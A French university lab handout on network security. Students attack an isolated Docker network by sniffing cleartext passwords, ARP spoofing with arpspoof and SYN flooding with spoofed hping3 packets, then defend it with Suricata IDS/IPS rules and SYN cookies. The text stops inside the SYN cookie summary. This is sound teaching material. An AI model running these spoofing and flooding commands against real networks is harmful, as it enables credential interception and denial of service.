# 🛠️ LAB 7

**Module :** Introduction à la Sécurité des Systèmes (GI2)  
**Enseignant :** Pr. Mohammed NASRI  
**Objectif :** Attaquer un petit réseau de lab (sniffing, ARP spoofing, SYN flood), puis le corriger (IDS, IPS, SYN cookies, HTTPS, SSH, VPN, ARP statique, pare-feu) et savoir expliquer, pour chaque correction, où était le problème et quelle est la solution.

> **Règle :** ces techniques ne s'utilisent que dans ce lab, ou sur des systèmes pour lesquels vous avez une autorisation écrite. Ailleurs, c'est une infraction pénale. Le réseau du lab est isolé (`internal: true`) : rien ne sort vers Internet.

---

# 📥 À faire avant la séance

Ces étapes demandent Internet et prennent du temps : faites-les **chez vous, avant la séance**.

### 1. Installer les outils

1. **Docker Desktop** (Windows, macOS) : https://www.docker.com/products/docker-desktop/ . Sous Linux : Docker Engine et le plugin `docker compose`.
2. **Wireshark** : https://www.wireshark.org/download.html . Il sert uniquement à **ouvrir** les fichiers de capture `.pcap`. Pendant l'installation, le composant Npcap est inutile pour ce lab.

> **Pas besoin de Kali installé, de carte réseau en mode *promiscuous* ni de clé Wi-Fi en mode *monitor*.** Tout le lab tourne dans des conteneurs Docker reliés par un switch virtuel. Votre carte réseau physique n'est jamais utilisée.

### 2. Télécharger le dossier du lab

Le lab se trouve dans le dépôt du cours, https://github.com/nasri-lab/introduction-cybersecurity , dans le dossier `labs` :
- le dossier **`lab7`** : tous les fichiers du lab, prêts à l'emploi. Vous n'avez rien à créer ni à copier ;
- le fichier **`lab7.md`** : cet énoncé.

1. Téléchargez le dépôt :
   - soit avec le bouton **Code › Download ZIP**, puis décompressez l'archive ;
   - soit avec git :
     ```powershell
     git clone https://github.com/nasri-lab/introduction-cybersecurity.git
     ```
2. Ouvrez un terminal **dans le dossier `lab7`** :
   ```powershell
   cd introduction-cybersecurity/labs/lab7
   ```
   Avec le ZIP, le dossier s'appelle `introduction-cybersecurity-main/labs/lab7`.

> Les commandes du lab sont écrites pour **PowerShell**. Elles fonctionnent telles quelles sous Linux et macOS, sauf quand une variante bash est indiquée. Sous Git Bash, tapez d'abord `export MSYS_NO_PATHCONV=1`.

### Que contient le dossier `lab7` ?

Dans le dépôt, le dossier `labs` contient cet énoncé `lab7.md` et le dossier `lab7`. Voici à quoi sert chaque élément du dossier `lab7`, pour savoir exactement ce que vous avez téléchargé.

```
labs/
├── lab7.md                     ← l'énoncé du lab (ce fichier)
└── lab7/                       ← le lab, prêt à l'emploi
    ├── docker-compose.yml      ← chef d'orchestre : conteneurs + réseau isolé
    │
    ├── serveur/                ← la cible : intranet + routeur
    │   ├── Dockerfile          ← image du serveur (python:3.12-slim)
    │   ├── web.py              ← intranet HTTP, en clair (port 80)
    │   └── telnet.py           ← console Telnet du routeur (port 23)
    │
    ├── victime/                ← le robot « alice »
    │   ├── Dockerfile          ← image de la victime (python:3.12-slim)
    │   └── victime.py          ← se connecte toutes les 8 s
    │
    ├── attaquant/              ← votre poste d'attaque
    │   └── Dockerfile          ← image Kali (attaquant ET sonde)
    │
    ├── suricata/               ← l'IDS / IPS
    │   ├── Dockerfile          ← image Suricata (debian:trixie-slim)
    │   └── rules/              ← vos règles (vide au départ)
    │
    ├── captures/               ← vos fichiers .pcap (vide au départ)
    └── logs/                   ← alertes de Suricata (vide au départ)
```

Le fichier `docker-compose.yml` crée, à partir de ces dossiers, un réseau isolé (le switch virtuel `br-lab`) et six conteneurs :

| Conteneur | Image | Quand il tourne | Rôle |
|---|---|---|---|
| `serveur` | python:3.12-slim | en permanence | Intranet et routeur à attaquer, puis à protéger |
| `victime` | python:3.12-slim | en permanence | Robot qui joue alice et produit le trafic |
| `attaquant` | Kali Linux | en permanence | Votre poste d'attaque (tcpdump, arpspoof, hping3) |
| `sonde` | Kali Linux (même image que l'attaquant) | à la demande | Capture du trafic sur le switch |
| `ids` | Suricata | à la demande (exercice 2) | Détecte et alerte |
| `ips` | Suricata (même image que l'IDS) | à la demande (exercice 2) | Détecte et bloque |

Les autres fichiers (règles Suricata, certificat, clés SSH, `console.py`, `wg0.conf`, `firewall.sh`…) sont créés par vous pendant l'exercice 2.

> **La sonde : à quoi sert-elle ?**
> La sonde est simplement une machine **branchée sur le switch pour voir ce qui passe par le switch**. Dans une entreprise, c'est le poste de l'administrateur relié au **port miroir** du switch : il reçoit une copie de tout le trafic, sans le modifier.
>
> Dans le lab, elle sert à deux choses :
> 1. **Voir la menace de vos yeux** : depuis son propre poste, l'attaquant ne voit rien, car le switch ne lui envoie pas le trafic des autres. La sonde, elle, voit tout, et vous montre que le mot de passe d'alice circule en clair.
> 2. **Comprendre le Man-in-the-Middle** : avec l'ARP spoofing, l'attaquant force le trafic à passer par son poste. Il voit alors **exactement la même chose que la sonde**, sans avoir besoin d'un port miroir. Le vrai problème n'est donc pas « qui écoute », mais le fait que le trafic circule **en clair**. C'est ce que corrige l'exercice 2.

> **Un IDS et un IPS logiciels, sans boîtier.**
> En entreprise, l'IDS et l'IPS sont souvent des boîtiers dédiés : l'IDS branché sur le port miroir, l'IPS posé en coupure sur le câble, avec deux cartes réseau. Ici, on utilise **Suricata**, un logiciel installé dans un conteneur, sans boîtier ni machine supplémentaire.
>
> C'est **le même logiciel** pour les deux rôles, mais trois choses changent :
>
> | | IDS (détecter) | IPS (bloquer) |
> |---|---|---|
> | **Position** | sur le côté : il écoute une **copie** du trafic sur le switch | sur le chemin : collé au serveur, **tout** le trafic TCP passe par lui avant d'arriver |
> | **Règles** | commencent par `alert` : il signale | commencent par `drop` : il jette le paquet |
> | **Lancement** | `suricata -i br-lab` : il lit le switch | `suricata -q 0` : il rend un verdict sur chaque paquet |
>
> L'image à retenir : l'IDS est une **caméra de surveillance**, l'IPS est un **videur à l'entrée**.

### 3. Construire toutes les images

```powershell
docker compose --profile outils --profile ids --profile ips build
```

→ **La commande se termine sans erreur** (plusieurs minutes la première fois). Si elle affiche `no configuration file provided`, vous n'êtes pas dans le dossier `lab7` : placez-vous dedans avec `cd`.

---

# Exercice 0 : Démarrer le lab

## 📋 Contexte et Travail à réaliser

### 1. Topologie

```
                   switch virtuel  br-lab  (10.10.0.0/24)
        ┌───────────────────────┼───────────────────────┐
   ┌──────────┐           ┌────────────┐          ┌────────────┐
   │ victime  │           │  serveur   │          │ attaquant  │
   │10.10.0.20│           │ 10.10.0.10 │          │ 10.10.0.66 │
   └──────────┘           └────────────┘          └────────────┘
   robot « alice »        intranet HTTP :80       conteneur Kali :
   toutes les 8 s         Telnet routeur :23      tcpdump, arpspoof, hping3
```

| Machine | IP | Rôle |
|---|---|---|
| `serveur` | 10.10.0.10 | Intranet web (port 80) et console Telnet d'un routeur (port 23), en clair |
| `victime` | 10.10.0.20 | Un robot qui joue l'utilisatrice « alice » |
| `attaquant` | 10.10.0.66 | Vous, côté attaque : un conteneur construit à partir de l'image officielle **Kali Linux** |
| `sonde` | (sur le switch) | Outil de capture branché sur le switch virtuel, lancé à la demande |

> **La victime est un robot.** Le conteneur `victime` n'est pas une vraie personne : c'est un petit script qui joue l'utilisatrice alice. Toutes les 8 secondes, il se connecte à l'intranet avec son identifiant et son mot de passe, puis au routeur en Telnet. C'est **ce trafic que vous allez espionner**. Ses messages servent aussi de témoin : tant qu'ils affichent `ok`, le service fonctionne. Si une attaque le casse, ils affichent `ÉCHEC`.

> **La sonde, dans le monde réel**, c'est un équipement qui reçoit une **copie du trafic** sans le modifier : soit un **port miroir** (SPAN), un port du switch configuré pour recevoir une copie de ce qui passe sur les autres ports, soit un **TAP réseau**, un boîtier inséré sur un câble qui duplique le trafic. On y branche Wireshark ou un IDS. C'est un outil d'administrateur : un attaquant n'y a normalement pas accès.

Le switch virtuel `br-lab` se comporte comme un **vrai switch** : il apprend quelle adresse MAC se trouve sur quel port et n'envoie chaque trame qu'au port du destinataire. Seuls le broadcast et les trames vers une MAC encore inconnue partent sur tous les ports.

### 2. Démarrer et vérifier

1. Démarrez le lab, puis suivez la victime (Ctrl+C pour quitter les logs) :
   ```powershell
   docker compose up -d
   docker compose ps
   docker compose logs -f victime
   ```
   → **`ps` affiche `serveur`, `victime` et `attaquant` à l'état `running`**, et les logs de la victime affichent toutes les 8 s l'heure, puis `ok` si sa connexion a réussi :
   ```
   14:02:11 HTTP ok
   14:02:11 Telnet ok
   ```

2. Vérifiez que la sonde voit le switch virtuel :
   ```powershell
   docker compose run --rm sonde ip -br link show br-lab
   ```
   → **Une ligne `br-lab  UP ...`.**
   > Si `br-lab` est introuvable, la sonde peut écouter directement la carte de la victime. Remplacez alors, dans tout le lab, `docker compose run --rm sonde` par `docker run --rm --network container:victime -v "${PWD}/captures:/captures" lab7-sonde`, et `-i br-lab` par `-i eth0`.

3. Notez l'adresse MAC de chaque machine.

   PowerShell :
   ```powershell
   foreach ($c in "serveur","victime","attaquant") { "$c : " + (docker compose exec -T $c cat /sys/class/net/eth0/address) }
   ```
   Linux, macOS ou Git Bash :
   ```bash
   for c in serveur victime attaquant; do echo "$c : $(docker compose exec -T $c cat /sys/class/net/eth0/address)"; done
   ```

| Machine | Adresse MAC |
|---|---|
| serveur | |
| victime | |
| attaquant | |

---

# Exercice 1 : Hack, attaquer le réseau

## 📋 Contexte et Travail à réaliser

Vous jouez l'attaquant. Pour chaque attaque, notez ce que vous obtenez : l'exercice 2 corrigera chaque faille.

---

### 1. Sniffing : écouter le trafic

> **Rappel :** une carte réseau jette normalement les trames qui ne sont pas adressées à sa MAC. Le sniffing consiste à garder aussi celles des autres. Sur un **hub** ou un **Wi-Fi ouvert**, tout le monde reçoit tout. Sur un **switch**, chacun ne reçoit que son propre trafic.

1. **Écoute depuis le poste de l'attaquant.** L'attaquant est un conteneur Kali : il dispose de `tcpdump`, comme un vrai poste Kali. Écoutez sa carte pendant 30 secondes (Ctrl+C pour arrêter) :
   ```powershell
   docker compose exec attaquant tcpdump -i eth0 -n
   ```
   → **`0 packets captured`, ou seulement quelques requêtes ARP en broadcast** (`ARP, Request who-has 10.10.0.10 tell 10.10.0.20`). Vous ne voyez **aucun** échange entre la victime et le serveur : le switch ne vous les envoie pas.
   > Pour vérifier que l'écoute fonctionne, laissez `tcpdump` tourner et, dans un deuxième terminal, videz le cache ARP de la victime : `docker compose exec victime ip neigh flush all`. Au cycle suivant de la victime, une requête `ARP, Request who-has 10.10.0.10 tell 10.10.0.20` apparaît : c'est un broadcast, donc tout le monde le reçoit.

2. **Écoute par la sonde, sur le switch** (l'équivalent d'un port miroir, ou d'un hub) :
   ```powershell
   docker compose run --rm sonde sh -c "tcpdump -i br-lab -A -n -l 'tcp port 80' | grep -E 'POST|user=|Cookie'"
   ```
   → **Le mot de passe et le cookie de session apparaissent en clair :**
   ```
   POST /login HTTP/1.1
   user=alice&password=Ete2026!
   Set-Cookie: session=3f9a1c0b7d2e4a61; Path=/
   Cookie: session=3f9a1c0b7d2e4a61
   ```

3. **Enregistrement d'une capture pour Wireshark.** La sonde enregistre 30 secondes de trafic dans le dossier `captures` :
   ```powershell
   docker compose run --rm sonde sh -c "timeout 30 tcpdump -U -i br-lab -w - > /captures/sniffing.pcap"
   ```
   → **Après 30 secondes, `ls captures` affiche `sniffing.pcap`.**

   Ouvrez `lab7\captures\sniffing.pcap` dans Wireshark : double-clic sur le fichier, ou Fichier › Ouvrir. Tapez `telnet` dans la barre de filtre, puis clic droit sur un paquet › **Suivre › Flux TCP**.
   → **Le mot de passe du routeur est lisible en entier :**
   ```
   login: admin
   Password: R0uteur!26
   routeur> show running-config
   hostname R1
   ...
   ```
   Essayez aussi les filtres `http.request.method == "POST"` et `ip.addr == 10.10.0.20`.

4. **Répondez :**
   1. Quand l'attaquant écoute **depuis son propre poste**, il ne voit rien. Pourquoi, alors qu'il est sur le même réseau ?
   2. À quelle situation réelle correspond **l'écoute par la sonde** ?
   3. Citez trois autres protocoles en clair qui exposeraient aussi des mots de passe.

<details>
<summary>Réponses attendues (cliquez pour afficher)</summary>

1. **Pourquoi l'attaquant ne voit rien depuis son poste ?** Le switch sait quelle machine est branchée sur quel port. Quand la victime parle au serveur, il envoie la trame uniquement sur le port du serveur. L'attaquant, branché sur un autre port, ne la reçoit jamais.
2. **À quoi correspond l'écoute par la sonde ?** À une situation où l'on reçoit le trafic de tout le monde : un hub, qui recopie chaque trame sur tous ses ports ; un Wi-Fi ouvert, où les ondes arrivent à toutes les cartes à portée ; ou un port miroir configuré par l'administrateur sur le switch.
3. **Quels autres protocoles en clair ?** Tous ceux qui ne chiffrent pas : FTP (fichiers), POP3 et IMAP (lecture de mails), SMTP sans TLS (envoi de mails), LDAP (annuaire), SNMP v1/v2c (supervision). Le DNS, lui, expose le nom des sites visités.

</details>

---

### 2. ARP spoofing et Man-in-the-Middle

> **Rappel :** sur un réseau local, une machine connaît l'IP de son correspondant, mais il lui faut sa **MAC** pour envoyer la trame. Elle la demande par **ARP** (« qui a 10.10.0.10 ? ») et garde la réponse en **cache**. ARP accepte n'importe quelle réponse, même non demandée, sans vérifier qui répond. L'**ARP spoofing** consiste à envoyer de fausses réponses (« 10.10.0.10, c'est ma MAC ») : la victime envoie alors ses trames à l'attaquant, et le switch les lui livre normalement.

Objectif : faire passer le trafic `victime ↔ serveur` par l'attaquant, et le lire **depuis son poste**, sans sonde.

1. **Observez le cache ARP de la victime :**
   ```powershell
   docker compose exec victime ip neigh
   ```
   → **`10.10.0.10 dev eth0 lladdr <MAC du serveur> REACHABLE`** : c'est la vraie MAC du serveur (comparez avec votre tableau).

2. **Vérifiez que l'attaquant fera suivre les paquets :**
   ```powershell
   docker compose exec attaquant cat /proc/sys/net/ipv4/ip_forward
   ```
   → **`1`** : l'attaquant fait suivre les paquets qui ne lui sont pas destinés (il les transmet au vrai destinataire, comme un routeur). Avec `0`, il les jetterait : la victime perdrait la connexion et l'attaque serait tout de suite remarquée.

3. **Empoisonnez les caches.** Dans un premier terminal, laissez tourner :
   ```powershell
   docker compose exec attaquant arpspoof -i eth0 -t 10.10.0.20 -r 10.10.0.10
   ```
   - `-t 10.10.0.20` : la cible, à qui l'on fait croire que l'attaquant est le serveur ;
   - `-r` : empoisonne aussi l'autre sens (on fait croire au serveur que l'attaquant est la victime).

   → **Une ligne toutes les 2 secondes environ :**
   ```
   <MAC attaquant> <MAC victime> 0806 42: arp reply 10.10.0.10 is-at <MAC attaquant>
   <MAC attaquant> <MAC serveur> 0806 42: arp reply 10.10.0.20 is-at <MAC attaquant>
   ```
   L'attaquant envoie des réponses ARP que personne n'a demandées.

4. **Constatez l'empoisonnement**, dans un deuxième terminal :
   ```powershell
   docker compose exec victime ip neigh
   ```
   → **`10.10.0.10` pointe maintenant vers la MAC de l'attaquant**, la même que celle de `10.10.0.66`. Deux IP différentes avec la même MAC : c'est le signe qui permet de détecter l'attaque.

5. **Sniffez depuis l'attaquant.** C'est **la même écoute depuis le poste de l'attaquant** qu'au début de la partie Sniffing, celle qui n'avait rien affiché. Seule différence : l'ARP spoofing est actif, donc la victime envoie désormais ses trames à la MAC de l'attaquant.
   ```powershell
   docker compose exec attaquant sh -c "tcpdump -i eth0 -A -n -l 'tcp port 80 or tcp port 23' | grep -E 'user=|Password|login:|Cookie'"
   ```
   → **Les identifiants apparaissent, cette fois depuis le poste de l'attaquant :**
   ```
   user=alice&password=Ete2026!
   Cookie: session=8c41d0e2a9b7f356
   login: admin
   Password: R0uteur!26
   ```
   Enregistrez une preuve pour votre compte rendu :
   ```powershell
   docker compose exec attaquant sh -c "timeout 30 tcpdump -U -i eth0 -w - > /captures/mitm.pcap"
   ```

6. **La victime remarque-t-elle quelque chose ?**
   ```powershell
   docker compose logs --tail 6 victime
   ```
   → **Toujours `HTTP ok` et `Telnet ok`** : l'attaquant lit les paquets puis les fait suivre au serveur, la victime ne voit aucune différence.

7. **Arrêtez l'attaque** (Ctrl+C dans le premier terminal).
   → **`Cleaning up and re-arping targets...`** : arpspoof renvoie les vraies associations IP/MAC. Après quelques secondes, `ip neigh` sur la victime affiche de nouveau la vraie MAC du serveur.

8. **Répondez :**
   1. Pourquoi ARP permet-il cette attaque ?
   2. Que se passerait-il si `ip_forward` valait `0` sur l'attaquant ?
   3. Si l'intranet était en HTTPS, que verrait encore l'attaquant **en écoutant depuis son poste pendant l'ARP spoofing** ?

<details>
<summary>Réponses attendues (cliquez pour afficher)</summary>

1. **Pourquoi ARP permet-il cette attaque ?** ARP n'a aucune authentification. Une machine accepte une réponse ARP même si elle n'a rien demandé, et met son cache à jour sans vérifier qui a répondu.
2. **Et si `ip_forward` valait `0` ?** Les paquets de la victime arriveraient chez l'attaquant et s'arrêteraient là. La victime perdrait la connexion au serveur (ses logs afficheraient `ÉCHEC`) : l'attaque deviendrait un déni de service, vite remarqué.
3. **Que verrait-il en HTTPS ?** Les adresses IP, les ports, les volumes échangés et le nom du serveur. Mais plus le mot de passe ni le cookie : le contenu est chiffré. L'exercice 2 le vérifie.

</details>

---

### 3. SYN flood

> **Rappel : ouvrir une connexion TCP se fait en trois messages.**
> 1. `SYN` (client → serveur) : « Je veux me connecter. »
> 2. `SYN-ACK` (serveur → client) : « D'accord, **je te réserve une place**. »
> 3. `ACK` (client → serveur) : « Connexion établie. »
>
> Le **SYN flood** envoie des milliers de `SYN` et **n'envoie jamais le `ACK`**. Chaque place reste réservée pour rien pendant environ une minute. Quand la file est pleine, les vrais clients sont refusés.

Le serveur a été **volontairement fragilisé** : SYN cookies désactivés et file d'attente réduite (voir `sysctls` dans `docker-compose.yml`).

1. **Mesurez la situation normale :**
   ```powershell
   docker compose exec victime curl -s -o /dev/null -w '%{http_code} en %{time_total} s\n' --max-time 5 http://10.10.0.10/
   docker compose exec serveur sh -c "ss -Htan state syn-recv | wc -l"
   ```
   → **`200 en 0.002 s` et `0`** : le serveur répond tout de suite, et aucune connexion n'est à moitié ouverte (état `SYN-RECV`).

2. **Lancez l'attaque pendant 30 secondes** (premier terminal) :
   ```powershell
   docker compose exec attaquant timeout 30 hping3 -S -p 80 -i u1000 -a 10.10.0.99 10.10.0.10
   ```
   - `-S` : paquets SYN ;
   - `-i u1000` : un paquet toutes les 1 000 microsecondes, soit 1 000 par seconde ;
   - `-a 10.10.0.99` : **IP source usurpée**. Cette adresse n'existe pas, donc personne ne répondra au `SYN-ACK`.

3. **Pendant l'attaque**, dans un deuxième terminal :
   ```powershell
   docker compose exec serveur sh -c "ss -Htan state syn-recv | wc -l"
   docker compose exec victime curl -s -o /dev/null -w '%{http_code} en %{time_total} s\n' --max-time 5 http://10.10.0.10/
   ```
   → **Le nombre de `SYN-RECV` plafonne (autour de 100 à 128) et `curl` échoue : `000 en 5.00 s`.** Les logs de la victime affichent `ÉCHEC : timed out`. Le serveur fonctionne toujours, mais il n'a plus de place pour de nouveaux clients.

4. **Après l'attaque**, relancez la commande `ss` toutes les 15 secondes.
   → **Le nombre redescend jusqu'à 0 en une minute environ**, puis `curl` répond de nouveau `200`.

5. **Répondez :**
   1. Pourquoi l'attaquant usurpe-t-il l'adresse IP source avec `-a` ?
   2. Quelle ressource du serveur est épuisée ? Le lien réseau est-il saturé ?
   3. Pourquoi bloquer l'adresse 10.10.0.99 ne suffirait pas face à un vrai attaquant ?

<details>
<summary>Réponses attendues (cliquez pour afficher)</summary>

1. **Pourquoi usurper l'IP source ?** Avec sa vraie IP, la machine de l'attaquant recevrait le `SYN-ACK` du serveur et répondrait automatiquement par un `RST` (« je n'ai rien demandé ») : le serveur libérerait aussitôt la place. Avec une IP qui n'existe pas, personne ne répond, et la connexion reste à moitié ouverte.
2. **Quelle ressource est épuisée ?** La file des connexions semi-ouvertes du serveur. Le lien réseau n'est pas saturé : c'est une attaque protocolaire, pas volumétrique.
3. **Pourquoi bloquer 10.10.0.99 ne suffit pas ?** Un vrai attaquant change d'adresse source à chaque paquet (`--rand-source`), ou utilise un botnet de milliers de machines (DDoS).

</details>

---

### 4. Bilan de l'exercice 1

| Attaque | Ce que vous avez obtenu | Propriété menacée |
|---|---|---|
| Sniffing | | |
| ARP spoofing / MITM | | |
| SYN flood | | |

<details>
<summary>Tableau attendu (cliquez pour afficher)</summary>

| Attaque | Ce que vous avez obtenu | Propriété menacée |
|---|---|---|
| Sniffing | Mot de passe de l'intranet, mot de passe du routeur, cookie de session | Confidentialité |
| ARP spoofing / MITM | Le même trafic, depuis le poste de l'attaquant, sans que la victime le remarque | Confidentialité, intégrité |
| SYN flood | Serveur injoignable pour la victime pendant l'attaque | Disponibilité |

</details>

---

# Exercice 2 : Fix, corriger le réseau

## 📋 Contexte et Travail à réaliser

Vous passez côté défense, sur le même lab. Chaque correction suit le même schéma : **rejouer l'attaque → appliquer le correctif → rejouer l'attaque**, puis lire l'encadré **Bilan du fix**.

| Attaque de l'exercice 1 | Correction |
|---|---|
| Toutes | 1. Détecter (IDS) · 2. Bloquer (IPS) |
| SYN flood | 3. SYN cookies |
| Sniffing | 4. HTTPS, puis SSH à la place de Telnet |
| ARP spoofing / MITM | 5. VPN WireGuard, puis ARP statique |
| Services ouverts à tous | 6. Pare-feu |

> **Ordre important :** à partir de la correction 5, ne redémarrez plus `serveur` ni `victime`. Un redémarrage efface le tunnel VPN et peut changer les adresses MAC.

---

### 1. Détecter les attaques avec un IDS

Un **IDS** reçoit une **copie** du trafic et lève des alertes, sans rien bloquer. Ici, Suricata écoute le switch virtuel `br-lab`, comme la sonde.

1. **Écrivez les règles** dans `suricata/rules/local.rules` :
   ```
   # Mot de passe envoyé en clair dans un formulaire HTTP
   alert http any any -> $HOME_NET any (msg:"LAB7 Mot de passe HTTP envoye en clair"; flow:to_server,established; http.method; content:"POST"; http.request_body; content:"password="; classtype:policy-violation; sid:1000001; rev:1;)

   # Invite de mot de passe Telnet : les identifiants vont suivre en clair
   alert tcp $HOME_NET 23 -> any any (msg:"LAB7 Connexion Telnet : identifiants en clair"; flow:from_server,established; content:"Password:"; classtype:policy-violation; sid:1000002; rev:1;)

   # Plus de 200 SYN par seconde vers le serveur web
   alert tcp any any -> $HOME_NET 80 (msg:"LAB7 SYN flood vers le serveur web"; flags:S; flow:stateless; threshold:type both, track by_dst, count 200, seconds 1; classtype:attempted-dos; sid:1000003; rev:1;)
   ```
   Lecture d'une règle : `action protocole source port -> destination port (options)`. Les options disent ce qu'on cherche (`content`), où (`http.request_body`), dans quel sens (`flow`), à partir de quel seuil (`threshold`), et le message à afficher (`msg`).

2. **Lancez l'IDS et suivez les alertes** (Ctrl+C pour quitter le suivi) :
   ```powershell
   docker compose --profile ids up -d ids
   docker compose exec ids tail -f /var/log/suricata/fast.log
   ```
   → **Deux alertes toutes les 8 secondes, provoquées par la victime :**
   ```
   [**] [1:1000001:1] LAB7 Mot de passe HTTP envoye en clair [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 10.10.0.20:48122 -> 10.10.0.10:80
   [**] [1:1000002:1] LAB7 Connexion Telnet : identifiants en clair [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 10.10.0.10:23 -> 10.10.0.20:51840
   ```

3. **Rejouez le SYN flood** pendant 20 secondes, en gardant le suivi des alertes ouvert :
   ```powershell
   docker compose exec attaquant timeout 20 hping3 -S -p 80 -i u1000 -a 10.10.0.99 10.10.0.10
   ```
   → **Environ une alerte `LAB7 SYN flood vers le serveur web` par seconde.** Pourtant, `docker compose logs --tail 4 victime` affiche toujours **`ÉCHEC`** : l'IDS voit l'attaque, mais ne l'arrête pas.

4. **Détectez l'ARP spoofing.** Suricata analyse le trafic IP : il ne voit pas ARP. On utilise la détection de doublons de Wireshark, en ligne de commande (`tshark`). Terminal 1 :
   ```powershell
   docker compose run --rm sonde tshark -i br-lab -Y arp.duplicate-address-detected
   ```
   Terminal 2 :
   ```powershell
   docker compose exec attaquant timeout 20 arpspoof -i eth0 -t 10.10.0.20 -r 10.10.0.10
   ```
   → **Dans le terminal 1 : `10.10.0.10 is at <MAC attaquant> (duplicate use of 10.10.0.10 detected!)`** : la même IP est annoncée avec deux MAC différentes.

5. **Retenez le vocabulaire des alertes :**

   > **Positif** = l'IDS alerte · **Négatif** = il ne dit rien · **Vrai** = il a raison · **Faux** = il se trompe.

   | | Vraie attaque | Trafic légitime |
   |---|---|---|
   | **Alerte** | **Vrai positif** : détection réussie | **Faux positif** : fausse alerte (et blocage en IPS) |
   | **Pas d'alerte** | **Faux négatif** : attaque ratée | **Vrai négatif** : normal |

   Classez dans ce tableau les alertes que vous venez d'obtenir.

> **Bilan du fix : IDS**
> - **Problème :** les attaques de l'exercice 1 passaient sans que personne ne s'en aperçoive.
> - **Cause :** aucun équipement n'observait le trafic.
> - **Solution :** un IDS (Suricata) sur le port miroir, avec des règles qui décrivent les attaques connues, plus une surveillance ARP (tshark, arpwatch). Il **voit et alerte, mais ne bloque pas**.

---

### 2. Bloquer avec un IPS

Un **IPS** est placé **en coupure** : le trafic le traverse et il peut le jeter. Ici, Suricata s'insère devant le serveur grâce à `NFQUEUE` : le noyau du serveur lui passe chaque paquet TCP et attend son verdict avant de le délivrer.

1. **Écrivez la règle de blocage** dans `suricata/rules/ips.rules` :
   ```
   # Au-delà de 30 SYN par minute depuis une même source : on jette
   drop tcp any any -> $HOME_NET 80 (msg:"LAB7 IPS : trop de SYN depuis la meme source, bloque"; flags:S; flow:stateless; detection_filter:track by_src, count 30, seconds 60; classtype:attempted-dos; sid:2000001; rev:1;)

   # Règle de la question 4 (laissez-la commentée pour l'instant)
   # drop tcp any any -> $HOME_NET 23 (msg:"LAB7 IPS : connexion admin sur le routeur, bloquee"; flow:to_server,established; content:"admin"; classtype:policy-violation; sid:2000002; rev:1;)
   ```
   La victime ouvre environ 15 connexions par minute : elle reste sous le seuil.

2. **Lancez l'IPS :**
   ```powershell
   docker compose --profile ips up -d ips
   docker compose exec serveur iptables -S
   ```
   → **Les lignes `-A INPUT -p tcp -j NFQUEUE --queue-num 0` et `-A OUTPUT -p tcp -j NFQUEUE --queue-num 0` apparaissent** : tout le trafic TCP du serveur passe par Suricata. La victime affiche toujours `HTTP ok` et `Telnet ok`.

3. **Rejouez le SYN flood.** Suivez les verdicts dans un terminal :
   ```powershell
   docker compose exec ips tail -f /var/log/suricata/fast.log
   ```
   Lancez l'attaque dans un autre :
   ```powershell
   docker compose exec attaquant timeout 20 hping3 -S -p 80 -i u1000 -a 10.10.0.99 10.10.0.10
   ```
   Pendant l'attaque, dans un troisième :
   ```powershell
   docker compose exec serveur sh -c "ss -Htan state syn-recv | wc -l"
   docker compose exec victime curl -s -o /dev/null -w '%{http_code} en %{time_total} s\n' --max-time 5 http://10.10.0.10/
   ```
   → **Des lignes `[Drop] ... LAB7 IPS : trop de SYN ...`, moins de 60 `SYN-RECV`, et `curl` répond `200` : la victime est servie pendant l'attaque.**

4. **Provoquez un faux positif.** Un analyste veut empêcher l'attaquant de se connecter en `admin` sur le routeur : décommentez la règle `2000002` dans `ips.rules`, puis :
   ```powershell
   docker compose --profile ips restart ips
   docker compose logs --tail 6 victime
   ```
   → **`telnet_session ÉCHEC : timed out`** : la règle bloque **la vraie administratrice**, qui utilise elle aussi le compte `admin`. En IDS, ce faux positif n'aurait produit qu'une alerte. En IPS, il **coupe le service**.

   Recommentez la règle, puis relancez `docker compose --profile ips restart ips` : `Telnet ok` revient.

5. **Et si l'IPS tombe en panne ?**
   ```powershell
   docker compose --profile ips stop ips
   docker compose logs --tail 4 victime
   ```
   → **`ÉCHEC` sur HTTP et Telnet.** Les règles `NFQUEUE` sont toujours là, mais plus personne ne rend de verdict : le noyau jette tout. C'est un fonctionnement **fail-closed** : sûr, mais une panne coupe le service. L'option `--queue-bypass` donnerait l'inverse (**fail-open**) : le trafic passerait sans inspection.

   Nettoyez :
   ```powershell
   docker compose exec serveur sh -c "iptables -D INPUT -p tcp -j NFQUEUE --queue-num 0; iptables -D OUTPUT -p tcp -j NFQUEUE --queue-num 0"
   ```
   → **`HTTP ok` et `Telnet ok` reviennent dans les logs de la victime.**

> **Bilan du fix : IPS**
> - **Problème :** l'IDS voyait le SYN flood, mais la victime restait privée de service.
> - **Cause :** un IDS ne reçoit qu'une copie du trafic, il ne peut pas l'arrêter.
> - **Solution :** un IPS en coupure, avec une règle `drop` et un seuil par source. Contreparties : un faux positif bloque un utilisateur légitime, et une panne de l'IPS coupe le réseau. On règle les signatures en mode IDS avant de passer en IPS.

---

### 3. Corriger le SYN flood à la racine : SYN cookies

L'IPS limite une source, mais un vrai attaquant change d'IP à chaque paquet. On corrige le serveur lui-même.

1. **Activez les SYN cookies** dans `docker-compose.yml`, service `serveur` :
   ```yaml
       sysctls:
         net.ipv4.tcp_syncookies: "1"        # était "0"
         net.ipv4.tcp_max_syn_backlog: "128"
   ```
   ```powershell
   docker compose up -d serveur
   docker compose exec serveur cat /proc/sys/net/ipv4/tcp_syncookies
   ```
   → **`1`**

2. **Rejouez l'attaque, sans IPS :**
   ```powershell
   docker compose exec attaquant timeout 20 hping3 -S -p 80 -i u1000 -a 10.10.0.99 10.10.0.10
   ```
   Pendant l'attaque :
   ```powershell
   docker compose exec serveur sh -c "ss -Htan state syn-recv | wc -l"
   docker compose exec victime curl -s -o /dev/null -w '%{http_code} en %{time_total} s\n' --max-time 5 http://10.10.0.10/
   docker compose exec serveur nstat -az TcpExtSyncookiesSent
   ```
   → **La file est pleine (environ 128), mais `curl` répond `200` en quelques millisecondes, et le compteur `TcpExtSyncookiesSent` augmente.**

> **Bilan du fix : SYN cookies**
> - **Problème :** quelques centaines de SYN par seconde rendaient le serveur injoignable.
> - **Cause :** le serveur réservait une place dans une file limitée pour chaque SYN, même pour des connexions qui ne seraient jamais terminées.
